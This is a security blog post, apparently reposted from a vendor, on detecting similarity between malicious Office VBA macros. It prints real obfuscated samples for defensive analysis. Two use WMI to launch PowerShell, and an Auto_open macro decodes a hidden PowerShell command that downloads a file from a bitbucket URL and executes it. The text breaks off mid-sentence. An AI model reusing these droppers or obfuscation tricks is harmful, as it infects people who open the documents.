---
title: Malicious Office Macros: Detecting Similarity in the Wild
url: https://buaq.net/go-145781.html
source: unSafe.sh - 不安全
date: 2023-01-17
fetch_date: 2025-10-04T04:02:10.359502
---

# Malicious Office Macros: Detecting Similarity in the Wild

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

Malicious Office Macros: Detecting Similarity in the Wild

Many security solutions employ signature-based detection. To bypass this, attackers oft
*2023-1-16 18:34:49
Author: [perception-point.io(查看原文)](/jump-145781.htm)
阅读量:18
收藏*

---

Many security solutions employ signature-based detection. To bypass this, attackers often rely on existing malicious samples to create new samples that preserve the original malicious behavior but have distinct signatures. This is usually done with the help of malware toolkits which can perform various transformations such as: obfuscation, packing, name shuffling, patching, etc. The resulting samples are generated with a unique signature, that is, previously unseen, but may still be similar to known malicious samples.

Therefore, detecting similarity between samples is an important capability for modern security solutions for a few reasons. First, similarity detection can improve malware detection: If a given sample is similar enough to previously seen samples that were already flagged as malicious, then it is very likely to be malicious as well. Second, similarity detection can help to automate the task of identifying malicious campaigns, which are often based on similar variants of the same malicious sample.

In this blog, we focus on similarity in the context of Microsoft Office macros, which are widely exploited by attackers as a platform for delivering malware. We will discuss several patterns of similarity based on real-world samples that we detected in the wild, and we will briefly describe our solution.

## Office Macros: Background

A macro is a special-purpose program embedded in a Microsoft Office document (Word, Excel, PowerPoint, etc.) which is used to automate various tasks such as keyboard strokes and mouse movements. A macro consists of modules written in VBA which is a powerful [imperative programming](https://en.wikipedia.org/wiki/Imperative_programming) language. A macro can access various machine resources: It can read and write to the file system, use the network, and execute commands. The execution of a macro is usually triggered by a callback function which is invoked when a specific event occurs. For example, the following macro is triggered when the (Word) document is opened, and executes a command that runs calc.exe:

```

					Sub Document_Open()
  Shell “calc.exe”
End Sub

```

The versatility and expressiveness of VBA is what attracts attackers to use macros as a component in the infection flow.

## Similarity Patterns: Examples

In this section, we will discuss several similarity patterns that we observed in samples from our clientsֵ’ traffic.

### Identifier Shuffling

One way to obtain different variants of the same malicious macro is by renaming identifiers: functions, variables, etc. This produces distinct macros which are semantically equivalent, that is, exhibit the same behavior. To illustrate this, let’s have a look at two malicious macros ([1], [2]) that we detected in our clients’ traffic. In both cases, the macro was contained in an Microsoft Office document that was delivered as an email attachment.

```

					Macro 1:

Private Sub Worksheet_Change(ByVal Target As Range)
  Set KYjo = CreateObject(VyWPh())
  Set hRprw = KYjo.Methods_(ActiveSheet.PageSetup.LeftHeader). _
    InParameters.SpawnInstance_
  hRprw.CommandLine = QdxzZa()
  hRprw.ProcessStartupInformation = gGuAUEItp
  fdf = fkldf(KYjo, hRprw)
End Sub

Function QdxzZa()
  QdxzZa = "C" + ActiveSheet.PageSetup.LeftFooter + fjjdf()
End Function

Function fkldf(ggg, f8df00)
  Set SjtN = ggg.ExecMethod_(rPjM(), f8df00)
End Function

Private Function fjjdf()
  fjjdf = "powe" + "rs" + Range("F100").Value
End Function

Private Function rPjM()
  rPjM = ActiveSheet.PageSetup.LeftHeader
End Function

Private Function VyWPh()
  VyWPh = ActiveSheet.PageSetup.CenterHeader
End Function

```

```

					Macro 2:

Private Sub Worksheet_Change(ByVal Target As Range)
  Set kBHE = CreateObject(hJsYX())
  Set PVleR = kBHE.Methods_(ActiveSheet.PageSetup.LeftHeader). _
    InParameters.SpawnInstance_
  PVleR.CommandLine = upzdrZ()
  PVleR.ProcessStartupInformation = izTXPtLqs
  fdf = fkldf(kBHE, PVleR)
End Sub

Function upzdrZ()
  upzdrZ = "C" + ActiveSheet.PageSetup.LeftFooter + fjjdf()
End Function

Function fkldf(ggg, f8df00)
  Set SjtN = ggg.ExecMethod_(YDTR(), f8df00)
End Function

Private Function fjjdf()
 fjjdf = "powe" + "rs" + Range("F100").Value
End Function

Private Function YDTR()
  YDTR = ActiveSheet.PageSetup.LeftHeader
End Function

Private Function hJsYX()
  hJsYX = ActiveSheet.PageSetup.CenterHeader
End Function

```

As you can see, these two macros are identical up to the names of some functions and variables. The matching identifiers are marked here in the same color. For example, the variable *KYjo* in the first macro (on the left) corresponds to the variable *kBHE* in the second macro (on the right).

Here, the identifier renaming has clearly no effect on the behavior. Both macros use the built-in callback function *Worksheet\_Change* to initiate the malicious flow which is obfuscated using various properties of the embedding document (page setup, spreadsheet cells, etc.).

After deobfuscation, the malicious flow can be described as follows:

First, an ActiveX object is created by invoking the *CreateObject* API with the *winmgmts:Win32\_Process* class (line X). Then, the arguments (*CommandLine* and *ProcessStartupInformation*) for the *Create* method of the WMI class are constructed (line X), where the *CommandLine* argument contains the command to be executed. Finally, the function *fkldf* is called and the method *Create* is invoked with the constructed arguments (line X), which leads to the execution of a PowerShell command that downloads and executes a malicious JavaScript payload.

### Modifying Constants

Another way to obtain different variants of the same malicious macro is by modifying constants (i.e. strings, integers, etc). Malicious macros often construct strings in an obfuscated manner, and then use them to execute commands or access the network in a later stage. This is done in the following sample ([3]), which was detected in one of our clients’ traffic:

```

					Function TCONETC$()
  TCONETC = "T^CONET^C&%#T^C" + "ONET^C$&&^^%%?" + "rsh?>> -<#T^CONET^C$T^CONET^C&% -?T^CONET^C&% BT^CT^CONET^C&%ass -c (" + "I" + "'" + "w" + "'" + "r" + "('https://bitbucket.org/!api/2.0/snippets/newwork123social/7qrz99/e79b393beb4b758a43d9b08b478c41cd905ee856/files/blackstartup.txt') -" + "u" + "s" + "?" + "" + "" + "B" + ") | .('{#}{_}'.r?T^CONET^C&%>ac?('_','0').r?T^CONET^C&%>ac?('#','1')-f'T^CONET^C&%#','>').r?T^CONET^C" + "&%>ac?('>','I').r?T^CONE" + "T^C&%>ac?('T^CONET^C&%','?').r?T^CONE" + "T^C&%" + ">ac?('#','ONE')"
  TCONETC = VBA.Replace(TCONETC, "T^CONET^C&%", "p")
  TCONETC = VBA.Replace(TCONETC, "#T^CONET^C$", "o")
  TCONETC = VBA.Replace(TCONETC, "&&^^%%", "w")
  TCONETC = VBA.Replace(TCONETC, "?", "e")
  TCONETC = VBA.Replace(TCONETC, ">", "l")
  TCONETC = VBA.Replace(TCONETC, "<", "N")
End _
Function

Sub _
Auto_open _
()
  MsgBox "Error!"
  Call _
  Shell&(TCONETC$, 0)
End Sub

```

In this macro, the function *TCONETC* first defines an obfuscated constant string (line X), and then uses the *Replace* API to perform several transformations (lines X) which eventually result in a PowerShell command that will be executed later in the function *Auto\_open* using the *Shell* API.

Such attacks often re-appear in slightly different configurations. The main logic for constructing the strings is reused, and only the initial input is patched in order to modif...